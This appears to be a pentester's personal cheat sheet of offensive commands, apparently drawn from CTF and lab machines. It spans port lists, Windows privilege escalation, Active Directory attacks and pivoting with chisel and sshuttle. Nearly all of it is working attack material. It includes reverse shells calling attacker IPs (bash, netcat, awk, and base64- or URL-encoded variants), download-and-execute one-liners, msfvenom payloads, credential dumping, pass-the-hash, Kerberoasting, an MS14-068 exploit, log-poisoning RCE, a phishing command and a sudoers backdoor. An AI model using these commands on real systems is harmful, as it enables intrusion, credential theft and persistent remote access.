TCP -p 1,3,7,9,13,17,19,21-23,25-26,37,43,53,79-82,88,100,106,110-111,113,119,135,139,143-144,179,199,254-255,280,311,389,427,443-445,464-465,497,513-515,543-544,548,554,587,593,625,631,636,646,787,808,873,902,990,993,995,1000,1022,1024-1033,1035-1041,1044,1048-1050,1053-1054,1056,1058-1059,1064-1066,1069,1071,1074,1080,1110,1234,1433,1494,1521,1720,1723,1755,1761,1801,1900,1935,1998,2000-2003,2005,2049,2103,2105,2107,2121,2161,2301,2383,2401,2601,2717,2869,2967,3000-3001,3128,3268,3306,3389,3689-3690,3703,3986,4000-4001,4045,4899,5000-5001,5003,5009,5050-5051,5060,5101,5120,5190,5357,5432,5555,5631,5666,5800,5900-5925,6000-6002,6004,6112,6646,6666,7000,7070,7937-7938,8000,8002,8008-8010,8031,8080-8081,8443,8888,9000-9001,9090,9100,9102,9999-10001,10010,32768,32771,49152-49157,50000

UDP - p7,9,13,17,19,21-23,37,42,49,53,67-69,80,88,111,120,123,135-139,158,161-162,177,192,199,389,407,427,443,445,464,497,500,514-515,517-518,520,593,623,626,631,664,683,800,989-990,996-999,1001,1008,1019,1021-1034,1036,1038-1039,1041,1043-1045,1049,1068,1419,1433-1434,1645-1646,1701,1718-1719,1782,1812-1813,1885,1900,2000,2002,2048-2049,2148,2222-2223,2967,3052,3130,3283,3389,3456,3659,3703,4000,4045,4444,4500,4672,5000-5001,5060,5093,5351,5353,5355,5500,5632,6000-6001,6346,7938,9200,9876,10000,10080,11487,16680,17185,19283,19682,20031,22986,27892,30718,31337,32768-32773,32815,33281,33354,34555,34861-34862,37444,39213,41524,44968,49152-49154,49156,49158-49159,49162-49163,49165-49166,49168,49171-49172,49179-49182,49184-49196,49199-49202,49205,49208-49211,58002,65024


# upgrade a nc reverse shell to a meterpreter shell with script

1. setup a multi handler listener on metasploit on port 8888 with payload linux/x86/shell_reverse_tcp
2. run the command on nc shell terminal below
3. bash -i >& /dev/tcp/172.16.40.6/8888 0>&1
4. Now we have a reverse meterpreter shell and a nc shell 

## Powershell PowerSploit Module and Usage #########

# uploading an entire directory of Recon to target via meterpreter for using powershell mmodules
meterpreter > upload /home/kali/Shared/Opt-Tools/PowerSploit/Recon/ C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\Modules 

# we then fire up a powerupshell 
meterpreter > powershell_shell 

# we then import the shell via command below						  
PS > cd  C:\Windows\system32\WindowsPowerShell\v1.0
PS > Import-Module -Name C:\Windows\system32\WindowsPowerShell\v1.0\Modules\Recon -Verbose

# we should expect the following output below
VERBOSE: Loading module from path 'C:\Windows\system32\WindowsPowerShell\v1.0\Modules\
VERBOSE: Loading module from path 'C:\Windows\system32\WindowsPowerShell\v1.0\Modules\
VERBOSE: Exporting function 'Get-System'.
VERBOSE: Importing function 'Write-UserAddMSI'.
....

# Get command help for Recon Module functions
PS > cd  C:\Windows\system32\WindowsPowerShell\v1.0\Modules
PS > Get-Command -Module Recon
CommandType     Name                                                Definition
-----------     ----                                                ----------
Function        ...                                                    ...
...

## burpsuite and ZAP web brutreforcing  -
https://rajendrakv.wordpress.com/2020/06/14/brute-force-using-burp-suite-and-owasp-zap/


## nmap web bruteforcing

# web bruteforcing with nmap - https://hub.packtpub.com/brute-forcing-http-applications-and-web-applications-using-nmap-tutorial/
nmap --script=http-form-brute.nse -p 8000 --script-args http-form-brute.method=POST,http-form-brute.path=/vbcms/login,http-form-brute.uservar=username,http-form-brute.passvar=password,http-form-brute.onsuccess=MESSAGE <targetIP>

## Hydra web bruteforcing 

# hydra web login bruteforce on port 8000 -method 1 - https://infinitelogins.com/2020/02/22/how-to-brute-force-websites-using-hydra/
hydra -L /home/kali/Wordlists/top-usernames-shortlist.txt -P /home/kali/Wordlists/top-passwords-shortlist.txt 10.10.18.182 -s 8000 http-post-form "/vbcms/login:username=^USER^&password=^PASS^:ENTER HERE THE EXACT ERROR MESSAGE" -t 64 -v -V -R

# hydra web login bruteforce on port 8000 -method 2 - https://www.geeksforgeeks.org/automated-brute-forcing-web-based-login/
hydra -I 10.10.29.86 -s 8000 http-form-post "/vbcms/login:username=^USER^&password=^PASS^:Invalid Username or Password" -L /home/kali/Wordlists/top-usernames-shortlist.txt -P /home/kali/Wordlists/top-passwords-shortlist.txt -t 10 -w 30 -o hydra-http-post-attack.txt -t 64 -v -V -R

# hydra bruteforce a service on targets port 55007
hydra -l boris -P /home/kali/Wordlists/top-passwords-shortlist.txt  IP -s55007 pop3 -t 20 -v -V -R

# hydra bruteforcing rdp login 
hydra -L users.txt -P /home/kali/Wordlists/top-passwords-shortlist.txt  IP -s3389 rdp -t 20 -v -V -R

# hydra bruteforcing ssh login 
hydra -L users.txt -P /home/kali/Wordlists/top-passwords-shortlist.txt IP -s22 ssh -t 10 -v -V -R

# hydra bruteforcing ftp login 
hydra -L users.txt -P /home/kali/Wordlists/top-passwords-shortlist.txt IP -s21 ftp -t 20 -v -V -R


## Proxychains nmap xargs scanning 

# Traditional way of running proxychains with Nmap took 193.62 seconds. Bringing Xargs into the loop with a thread count of 50 dramatically improves the results and only took 9 seconds to complete. Example:
seq 1 1000 | xargs -P 50 -I{} proxychains3 nmap --top-ports 5000 {} -sTV -sC -Pn --open -n -T4 --min-parallelism 100 --min-rate 1 --oA proxychains_nmap --append-output <IP>

# If you want to run multiple ports or port ranges against multiple hosts you could use the following alternative:
seq 1 254 | xargs -P 50 -I{} proxychains3 nmap -p 80,443,3389,445,21,22 -sTV -sC -Pn --open -n -T4 --min-parallelism 100 --min-rate 1 --oA proxychains_nmap --append-output <HOSTS_IPS>{}
 
# If you want to run top ports scan against multiple hosts you could use the following alternative:
seq 1 254 | xargs -P 50 -I{} proxychains3 nmap --top-ports 1000 -sTV -sC -Pn --open -n -T4 --min-parallelism 100 --min-rate 1 --oA proxychains_nmap_fast --append-output <HOSTS_IPS> {}

# Then grep the output for open ports:
grep open/tcp proxychains_nmap

# noisy proxychains version scan for top 1000 (might skip ports)
sudo proxychains3 nmap -T4 --top-ports 1000 -sTV -sC -Pn --open -n --max-os-tries 1 --privileged -n -v --max-retries 3 --min-rtt-timeout 500ms --max-rtt-timeout 3000ms --initial-rtt-timeout 500ms --defeat-rst-ratelimit --min-rate 450 --max-rate 15000 --script-timeout 180 --data-length=50 --min-parallelism 100 --oA proxychains_nmap_IP --append-output <IP>

# noisy proxychains version scan for top 5000 (might skip ports)
sudo proxychains3 nmap -T4 --top-ports 1000 -sTV -Pn --open -n --max-os-tries 1 --privileged -n -v --max-retries 3 --min-rtt-timeout 500ms --max-rtt-timeout 3000ms --initial-rtt-timeout 500ms --defeat-rst-ratelimit --min-rate 450 --max-rate 15000 --script http-unsafe-output-escaping --script http-sql-injection --script smb-os-discovery --script smb-enum-shares --script nfs-ls --script vuln --script-timeout 180 --data-length=50 --min-parallelism 100 --oA proxychains_nmap_IP --append-output <IP>

 

## Uploading Files with VBScript

# execute command below on target shell
echo dim xHttp: Set xHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")  > dl.vbs &echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> dl.vbs &echo xHttp.Open "GET", WScript.Arguments(0), False  >> dl.vbs &echo xHttp.Send >> dl.vbs &echo bStrm.type = 1 >> dl.vbs &echo bStrm.open >> dl.vbs &echo bStrm.write xHttp.responseBody >> dl.vbs &echo bStrm.savetofile WScript.Arguments(1), 2 >> dl.vbs

# fire up a python server and execute command after
cscript dl.vbs "http://172.16.40.5/launcher.vbs" ".\launcher.vbs"

# powershell one-liner uploading files to target  from attacker
IEX(New-Object System.Net.WebClient).DownloadFile("http://172.16.40.5/launcher.bat", "C:\Users\Public\Downloads\launcher.bat")

## Uploading Files with Python

# python download one-liner
python -c "import urllib.request; urllib.request.urlretrieve('http://172.16.40.5/launcher.bat', 'C:\\Users\\Public\\Downloads\\launcher.bat');"

## Uploading files with Scripting When All Else Fails

# Windows file transfer script that can be pasted to the command line.  File transfers to a Windows machine can be tricky without a Meterpreter shell.  The following script can be copied and pasted into a basic windows reverse shell and used to transfer files from a web server (the timeout 1 commands are required after each new line)

echo Set args = Wscript.Arguments  >> webdl.vbs
timeout 1
echo Url = "http://172.16.40.5/launcher.bat" >> webdl.vbs
timeout 1
echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")  >> webdl.vbs
timeout 1
echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> webdl.vbs
timeout 1
echo xHttp.Open "GET", Url, False  >> webdl.vbs
timeout 1
echo xHttp.Send  >> webdl.vbs
timeout 1
echo with bStrm      >> webdl.vbs
timeout 1
echo 	.type = 1 '      >> webdl.vbs
timeout 1
echo 	.open      >> webdl.vbs
timeout 1
echo 	.write xHttp.responseBody      >> webdl.vbs
timeout 1
echo 	.savetofile "C:\temp\launcher.bat", 2 '  >> webdl.vbs
timeout 1
echo end with >> webdl.vbs
timeout 1
echo

# The file above can be run using the following syntax:
C:\temp\launcher.bat webdl.vbs

## Transferring a payload file from attacker to target via SMB 

# On Kali, generate a reverse shell executable (reverse.exe) using msfvenom. Update the LHOST IP address accordingly:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe

# Transfer the reverse.exe file to the C:\PrivEsc directory on Windows. There are many ways you could do this, however the simplest is to start an SMB server on Kali in the same directory as the file, and then use the standard Windows copy command to transfer the file. On Kali, in the same directory as reverse.exe payload, type command below:
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .

# On Windows (update the IP address with your Kali IP):
copy \\10.13.1.99\kali\reverse.exe C:\Users\reverse.exe

## Exploit searching for specific version
 
# using searchsploit to find exploits
searchsploit apache | grep PHP


## Using windows accesschk.exe program to check for service write permissions for priv escalation

# We will Query the "filepermsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME).
sc qc filepermsvc

# Using accesschk.exe, note that the service binary (BINARY_PATH_NAME) file is writable by everyone:
C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"

# create a reverse shell non-staged payload using msfvenom 
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe

# Copy the reverse.exe executable you created and replace the filepermservice.exe with it:
copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y

# Start a listener on Kali :
nc -lvnp 53

# start the service to spawn a reverse shell running with SYSTEM privileges and get system shell!
net start filepermsvc


## Using windows accesschk.exe program to check for autorun executables that have write permissions

# Query the registry for AutoRun executables:
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Using accesschk.exe, note that one of the AutoRun executables is writable by everyone:
C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"

# Copy the reverse.exe executable you created and overwrite the AutoRun executable with it:
copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y

# Start a listener on Kali and then restart the Windows VM. Open up a new RDP session to trigger a reverse shell running with admin privileges. You should not have to authenticate to trigger it.
rdesktop 10.10.14.233


## Query the registry for AlwaysInstallElevated keys for priv Escalation:

# Query both regestries HKCU & HKLM for AlwaysInstallElevated keys:
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Note that both keys are set to 1 (0x1). On Kali, generate a reverse shell Windows Installer (reverse.msi) using msfvenom. Update the LHOST IP address accordingly:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.1.99 LPORT=53 -f msi -o reverse.msi

# Transfer the reverse.msi file to the C:\PrivEsc directory on Windows (use the SMB server method from earlier).
copy \\10.13.1.99\kali\reverse.msi C:\PrivEsc\reverse.msi 

# Start a listener on Kali 
nc -lvnp 53

# and then run the installer to trigger a reverse shell running with SYSTEM privileges:
msiexec /quiet /qn /i C:\PrivEsc\reverse.msi

## The registry can be searched for keys and values that contain the word "password" and Autologon creds found can be used to escalate privs

# search for keys and values that contain the word "password"
reg query HKLM /f password /t REG_SZ /s

# If you want to save some time, query this specific key to find admin AutoLogon credentials:
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"

# On Kali, use the winexe command to spawn a command prompt running with the admin privileges (update the password with the one you found):
winexe -U 'admin%password' //10.10.14.233 cmd.exe

## List All saved credentials and use them to login as admin:

# command to list creds 
cmdkey /list

# Note that credentials for the "admin" user are saved. If they aren't, run the C:\PrivEsc\savecred.bat script to refresh the saved credentials.
savecred.bat

# Start a listener on Kali
nc -lvnp 53

# run the reverse.exe executable using runas with the admin user's saved credentials and get admin!:
runas /savecred /user:admin C:\PrivEsc\reverse.exe

## Dumping Passwords - Security Account Manager

# The SAM and SYSTEM files can be used to extract user password hashes. This VM has insecurely stored backups of the SAM and SYSTEM files in the C:\Windows\Repair\ directory. Transfer the SAM and SYSTEM files to your Kali VM via smb:
copy C:\Windows\Repair\SAM \\172.16.40.5\kali\
copy C:\Windows\Repair\SYSTEM \\172.16.40.5\kali\

# On Kali, clone the creddump7 repository (the one on Kali is outdated and will not dump hashes correctly for Windows 10!) and use it to dump out the hashes from the SAM and SYSTEM files:
cd /home/kali/Shared/Opt-Tools/
git clone https://github.com/Neohapsis/creddump7.git
sudo apt install python-crypto

# run command within dumped creds
/home/kali/Shared/Opt-Tools/creddump7/pwdump.py SYSTEM SAM 


# Crack the admin NTLM hash using hashcat or hatecrack.py:
hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt

## Passing the hash via winexe kali command

# You can use the cracked password to log in as the admin using winexe or RDP. Why crack a password hash when you can authenticate using the hash?

# Use the full admin hash with pth-winexe to spawn a shell running as admin without needing to crack their password. Remember the full hash includes both the LM and NTLM hash, separated by a colon:
pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //10.10.11.43 cmd.exe

# now we have an admin shell!

## Priv escalation via scheduled tasks

# View the contents of the C:\DevTools\CleanUp.ps1 script:
type C:\DevTools\CleanUp.ps1

# The script seems to be running as SYSTEM every minute. Using accesschk.exe, note that you have the ability to write to this file:
C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1

# Start a listener on Kali and then append a line to the C:\DevTools\CleanUp.ps1 which runs the reverse.exe executable you created:
echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1

# Wait for the Scheduled Task to run, which should trigger the reverse shell as SYSTEM.

## Priv escalation via startup apps 

# Using accesschk.exe, note that the BUILTIN\Users group can write files to the StartUp directory:
C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

# Using cscript, run the C:\PrivEsc\CreateShortcut.vbs script which should create a new shortcut to your reverse.exe executable in the StartUp directory:
cscript C:\PrivEsc\CreateShortcut.vbs

# Start a listener on Kali, and then simulate an admin logon using RDP and the credentials you previously extracted:
rdesktop -u admin 10.10.11.43

# A shell running as admin should connect back to your listener.

## Rogue Potato Exploitation of SeImpersonatePrivilege and SeAssignPrimaryTokenPrivilege 
https://0xdf.gitlab.io/2020/09/08/roguepotato-on-remote.html

## Print Spoofer Exploitation of Impersonation privs
https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/

# xfreerdp syntax
xfreerdp /u:USER /p:PASS /v:IP

# rpc enum 
https://0xdf.gitlab.io/2020/03/21/htb-forest.html

# bash one-liner to grab kerberos hashes using impacket tool 
while read p; do python3 GetNPUsers.py egotistical-bank.local/"$p" -request -no-pass -dc-ip 10.129.1.165 >> hash.txt; done < unames.txt

# transfer files from attacker to a windows AD environment 

1. fire up python server  -> python -m SimpleHttpServer 80
2. on target terminal -> certutil.exe -urlcache -split -f http://10.13.1.99/shell-x86.exe shell-x86.exe
3. alternative -> powershell.exe wget "http://10.13.1.99/nc.exe" -outfile "C:\Windows\Temp\nc.exe"
4. other alternative -> powershell.exe -c (new-object System.Net.WebClient).DownloadFile('http://10.10.X.X/nc.exe','c:\temp\nc.exe')


# bloodhound one-liner to extract AD info for graphing 
/home/kali/Shared/Opt-Tools/bloodHound.py/bloodhound.py -u svc_loanmgr -p Moneymakestheworldgoround! -d EGOTISTICAL-BANK.LOCAL -ns 10.129.1.165 -c All

# creating a zip file that includes bloodhound output json files from above command to use for graphing 
zip map.zip *.json

# use Pypykatz on extracted lsass.DMP file to retrieve NThashes
pypykatz lsa minidump lsass.DMP

# check the account lockout of a domain policy, if lockoutThreshold returns 0, means we can attempt an unlimited number of passwords without locking account
ldapsearch -D 'BLACKFIELD\support' -w '#00^BlackKnight' -p 389 -h 10.10.10.192 -b "dc=blackfield,dc=local" -s sub "*" | grep lockoutThreshold

# dump lsa creds then use domain spraying with CrackMapExec in order to discover a correct combination 
pypykatz lsa minidump lsass.DMP | grep 'NT:' | awk '{ print $2 }' | sort -u >hashes
pypykatz lsa minidump lsass.DMP | grep 'Username:' | awk '{ print $2 }' | sort -u > users
crackmapexec smb 10.10.10.192 -u users -H hashes

# using impacket wmiexec to spawn a shell with hashes 
impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee Administrator@10.129.1.243

# enumerate LDAP using windap binary 
/home/kali/Shared/Opt-Tools/windapSearch/windapsearch-linux-amd64 -m MODULE -d Resolute.megabank.local --dc-ip 10.129.1.152

# dump all attributes from LDAP using windap and check for passwords stored in descriptions or other fields
/home/kali/Shared/Opt-Tools/windapSearch/windapsearch-linux-amd64 -m users --full -d Resolute.megabank.local --dc-ip 10.129.1.152 | grep Password

# bash script to loop through LDAP user list and verify their credentials via rpcclient
for u in $(cat users.txt | awk -F@ '{print $1}' | awk -F: '{print $2}');
do 
rpcclient -U "$u%Welcome123!" -c "getusername;quit" 10.129.1.152 | grep Authority;
done

# sending a phish email with sendmail 
sendEmail -f finance@megabank.com -t nico@megabank.com -u "Invoice Attached" -m "You are overdue payment" -a /root/.msf4/local/invoice.doc -s 10.129.4.113 -v

# get a plaintext password from a xml file by loading it with Import-CliXml, and then dumping the results
powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *" 
 

# download file from windows target machine to attacker machine via scp (ssh acccess needed)
scp tom@10.129.4.113:C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors\FiletoDownload .

# download directory from linux target machine to attacker machine via scp (ssh acccess needed)
scp -P 22 alex@10.10.150.82:/usr/local/apache2/htdocs/* .

# download file from target machine to attacker using powershell
certutil.exe -urlcache -split -f http://10.10.14.67:8000/acls.csv acls.csv

# download file from target machine to attacker using impacket smbserver  (NOTE: you can create a random username and password with smbserver)
on attacker -> impacket-smbserver -smb2support share . -username USER -password PASS
on target - > net use \\ATTACKER_IP\share /u:USER PASS
on target -> copy 20201015050858_BloodHound.zip \\ATTACKER_IP\share\

# mount a targets anonymous share to attackers machine  
mount -t cifs -o rw,username=guest,password= '//10.129.1.169/Department Shares' /mnt

# bash script to determine what target shares are writeable
find . -type d | while read directory; do 
    touch ${directory}/0xdf 2>/dev/null && echo "${directory} - write file" && rm ${directory}/0xdf; 
    mkdir ${directory}/0xdf 2>/dev/null && echo "${directory} - write dir" && rmdir ${directory}/0xdf; 
done

# dump domain info via ldap 
ldapdomaindump -u 'htb.local\amanda' -p Ashare1972 10.129.1.169 -o /home/kali/Shared/Courses/hackTheBox/sizzle/ldap/

# kerbroast attack using Rubeaus
 .\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972

# portforward using chisel binary, first transfer binary to target and then run command below
.\chiselx64.exe client 10.10.14.67:8008 R:88:127.0.0.1:88 R:389:localhost:389

# portforward using chisel binary, now run command below on attacker machine 
chisel server -p 8008 --reverse

# bypassing applocker permission folder with write access
C:\Windows\System32\spool\drivers\color

# enum ldap for domain names 
ldapsearch -h 10.10.10.182 -x -s base namingcontexts

# enum all ldap info and dump to a file
ldapsearch -h 10.10.10.182 -x -b "DC=cascade,DC=local"  | tee ldapEnum.txt

# enum ldap only for users and dump to a file
ldapsearch -h 10.10.10.182 -x -b "DC=cascade,DC=local" '(objectClass=person)' | tee ldapUsers.txt

# connect to a remote smb share and place all files one folder , then download files to local machine, and search for loot
mkdir smb-data
smbclient --user USER //10.129.4.211/SHARE_NAME PASS
smb: \>mask ""
smb: \>recurse ON
smb: \>prompt OFF
smb: \>mget *
find smb-data/ -type f

# PowerShell command to query all of the deleted objects within a domain:
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects

# ms14-068 windows exploit - python script for creating a golden ticket to admin shell exploit 
python ms14-068.py -u james@htb.local -s S-1-5-21-4220043660-4019079961-2895681657 -d mantis.htb.local -p J@m3s_P@ssW0rd! 

# ms14-068 windows exploit - impacket tool to obtain admin shell
/home/kali/Shared/Opt-Tools/impacketEnv/bin/goldenPac.py -dc-ip 10.129.4.241 -target-ip 10.129.4.241 htb.local/james@mantis.htb.local

# searchsploit - cat an exploit on terminal and redirect to a file 
searchsploit -x /path/exploit/file | tee exploit.type

## PHP RFI - Directory Transversal Command Injection Attack

# change user agent for php server  with curl  command and assign a string of c
 curl "http://10.10.189.87/" -H "User-Agent: <?php system(\$_GET['c']); ?>"

# now we can fire up a python server, and transfer file from local box to target server via url command 
view-source:http://10.10.189.87/?view=dog../../../../../../var/log/apache2/access.log&ext&c=curl%20http://10.13.1.99/shell.php%20-o%20shell.php


# pass the hash RDP
xfreerdp /u:USER /d:DOMAIN /pth:NTLM /v:IP

# use nessus with proxychains 
proxychains /etc/init.d/nessusd stop
proxychains /etc/init.d/nessusd start

# scanning with nessus via metasploit (using advanced policy)
nessus_scan_new ad629e16-03b6-8c1d-cef6-ef8c9dd3c658d24bd260ef5f9e66 "FooPhonesLLC_Internal_Advanced" "FooPhonesLLC_Internal_Advanced" 10.185.10.25,55


# enable rdp via command line
https://www.technig.com/enable-remote-desktop-using-command/

# connect to remote pc via command line
mstsc.exe /v:WIN7 /w:640 /h:480

# xfreerdp connection via proxychains
proxychains xfreerdp /u:share_admin /v:10.185.10.34 /p:'Wind0wz87!kj'

# lets transfer a file from our machine to remote target via proxychains and scp
proxychains scp /home/kali/Shared/Opt-Tools/linux-exploit-suggester/linux-exploit-suggester.sh jeremy@10.185.11.127:/tmp

# we can also open a rdp session via meterpreter 
meterpreter > run post/windows/manage/enable_rdp

# adding jeremny to sudo users
echo “jeremy ALL=(ALL) NOPASSWD:ALL” >> /etc/sudoers

# netcat reverse shell one-liner
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.1.99 8888 >/tmp/f

# echo netcat reverse shell inside a file 
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.1.99 8888 >/tmp/f" >> backup.sh


# open a ssh shell but dont load rc profile for unstable shell fix
ssh jeff@jeff.thm -t "bash --noprofile"


# using john to bruteforce ssh via private RSA key discovered, make sure to add private RSA text in a file name id_rsa before running john
/usr/share/john/ssh2john.py id_rsa > id_rsa.hash

# base64 decode command  
echo 'string=' | base64 --decode

# base64 decode txt file 
base64 -d encodedData.txt

# awk rev shell for restricted servers (note: use burp suite to encode url then send request via repeater)
awk 'BEGIN {s = "/inet/tcp/0/10.13.1.99/1337"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null

# url encoded awk rev shell above
%61%77%6b%20%27%42%45%47%49%4e%20%7b%73%20%3d%20%22%2f%69%6e%65%74%2f%74%63%70%2f%30%2f%31%30%2e%31%33%2e%31%2e%39%39%2f%31%33%33%37%22%3b%20%77%68%69%6c%65%28%34%32%29%20%7b%20%64%6f%7b%20%70%72%69%6e%74%66%20%22%73%68%65%6c%6c%3e%22%20%7c%26%20%73%3b%20%73%20%7c%26%20%67%65%74%6c%69%6e%65%20%63%3b%20%69%66%28%63%29%7b%20%77%68%69%6c%65%20%28%28%63%20%7c%26%20%67%65%74%6c%69%6e%65%29%20%3e%20%30%29%20%70%72%69%6e%74%20%24%30%20%7c%26%20%73%3b%20%63%6c%6f%73%65%28%63%29%3b%20%7d%20%7d%20%77%68%69%6c%65%28%63%20%21%3d%20%22%65%78%69%74%22%29%20%63%6c%6f%73%65%28%73%29%3b%20%7d%7d%27%20%2f%64%65%76%2f%6e%75%6c%6c%0a


# base64 rev shell for stealth
echo "bash -c 'bash -i >& /dev/tcp/10.9.0.17/4444 0>&1'" | base64 -w0
echo OUTPUT_B64 | base64 -d | bash 2>/dev/null


# updating unstable shell to socat shell

# Listener(Attacker):
socat `tty`,raw,echo=0 tcp-listen:4444

# Victim(Target):
wget -q http://10.9.0.17/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.9.0.17:4444

## Pivoting Notes (Socks Proxy vs  Port  Forwarding)

# Tunnelling/Proxying: Creating a proxy type connection through a compromised machine in order to route all desired traffic into the targeted network. This could potentially also be tunnelled inside another protocol (e.g. SSH tunnelling),which can be useful for evading a basic Intrusion Detection System (IDS) or firewall. A proxy is good if we want to redirect lots of different kinds of traffic into our target network -- for example, with an nmap scan, or to access multiple ports on multiple different machines.

# Port Forwarding: Creating a connection between a local port and a single port on a target, via a compromised host. Port Forwarding tends to be faster and more reliable, but only allows us to access a single port (or a small range) on a target device. Remote Port Forward: A remote port forward is when we connect back from a compromised target to create the forward. As with SSH, a local port forward is where we connect from our own attacking machine to a chisel server listening on a compromised target.

# Summary : Which style of pivoting is more suitable will depend entirely on the layout of the network, so we'll have to start with further enumeration before we decide how to proceed. As a general rule, if you have multiple possible entry-points, try to use a Linux/Unix target where possible, as these tend to be easier to pivot from. An outward facing Linux webserver is absolutely ideal.

## Chisel
# Note: the use of R:socks in chisel commands. "R" is prefixed to remotes (arguments that determine what is being forwarded or proxied -- in this case setting up a proxy) when connecting to a chisel server that has been started in reverse mode. It essentially tells the chisel client that the server anticipates the proxy or port forward to be made at the client side (e.g. starting a proxy on the compromised target running the client, rather than on the attacking machine running the server). Once again, reading the chisel help pages for more information is recommended. 

# reverse SOCKS Proxy with chisel on linux target for rev shells, ( must setup socks5 proxy in proxychains on port 1080). This connects back from a compromised server to a listener waiting on our attacking machine.
1. curl http://ATTACKER/chisel -o chisel && chmod +x chisel
2. ./chisel server -p 1338 --reverse
3. ./chisel client ATTACKER_IP:1338 R:socks

1. (on target) 
2. (as attacker)  start chisel in server mode on our Kali host, and listening on a port that is open for outbound connections in the target firewall
3. (on target)    despite connecting back to port 1337, the actual proxy has been opened on 127.0.0.1:1080. We will be using port 1080 when sending data through the proxy 

# forward SOCKS proxy with chisel on linux target for bind shells ( must setup socks5 proxy in proxychains on port 1080)
1. curl http://ATTACKER/chisel -o chisel && chmod +x chisel
2. /chisel server -p LISTEN_PORT --socks5
3. ./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks

1. (on target)
2. (on target)
3. (as attacker)  In this command, PROXY_PORT is the port that will be opened for the proxy. For example, ./chisel client 172.16.0.10:8080 1337:socks would connect to a chisel server running on port 8080 of 172.16.0.10. A SOCKS proxy would be opened on port 1337 of our attacking machine. 

# Local Port Forward with chisel
1. curl http://ATTACKER/chisel -o chisel && chmod +x chisel
2. ./chisel server -p LISTEN_PORT
3. ./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT

1. (on target)
2. (as attacker)
3. (on target)  As with SSH, a local port forward is where we connect from our own attacking machine to a chisel server listening on a compromised target. For example, to connect to 172.16.0.5:8000 (the compromised host running a chisel server), forwarding our local port 2222 to  access  172.16.0.10:22 (our intended target on port 22), we could use: ./chisel client 172.16.0.5:8000 2222:172.16.0.10:22

# remote Port Forward with chisel 
1. curl http://ATTACKER/chisel -o chisel && chmod +x chisel
2. ./chisel server -p LISTEN_PORT --reverse
3. ./chisel client ATTACKING_IP:LISTEN_PORT R:OUR_LOCAL_PORT:TARGET_IP:TARGET_PORT 

1. (on target)
2. (as attacker)
3. (on target)  You may recognise this as being very similar to the SSH reverse port forward method, where we specify the local port to open, the target IP, and the  target port, separated by colons. Note the distinction between the LISTEN_PORT and the LOCAL_PORT. Here the LISTEN_PORT is the port that we started the chisel server on, and the LOCAL_PORT is the port we wish to open on our own attacking machine to link with the desired target port.  To use an old example, let's assume that our own IP is 172.16.0.20, the compromised server's IP is 172.16.0.5, and our target is port 22 on 172.16.0.10. The syntax for forwarding 172.16.0.10:22 back to port 2222 on our attacking machine would be as follows: ./chisel client 172.16.0.20:1337 R:2222:172.16.0.10:22.  Connecting back to our attacking machine, functioning as a chisel server started with: ./chisel server -p 1337 --reverse. This would allow us to access 172.16.0.10:22 (via SSH) by navigating to 127.0.0.1:2222 on our attacker machine.     


## sshuttle

# This tool is quite different from the others we have covered so far. It doesn't perform a port forward, and the proxy it creates is nothing like the ones we have already seen. Instead it uses an SSH connection to create a tunnelled proxy that acts like a new interface. In short, it simulates a VPN, allowing us to route our traffic through the proxy without the use of proxychains (or an equivalent). We can just directly connect to devices in the target network as we would normally connect to networked devices. As it creates a tunnel through SSH (the secure shell), anything we send through the tunnel is also encrypted, which is a nice bonus. We use sshuttle entirely on our attacking machine, in much the same way we would SSH into a remote server. Whilst this sounds like an incredible upgrade, it is not without its drawbacks. For a start, sshuttle only works on Linux targets. It also requires access to the compromised server via SSH, and Python also needs to be installed on the server. That said, with SSH access, it could theoretically be possible to upload a static copy of Python and work with that. These restrictions do somewhat limit the uses for sshuttle; however, when it is an option, it tends to be a superb bet!

# First of all we need to install sshuttle on our attacker machine. On Kali this is as easy as using the apt package manager:
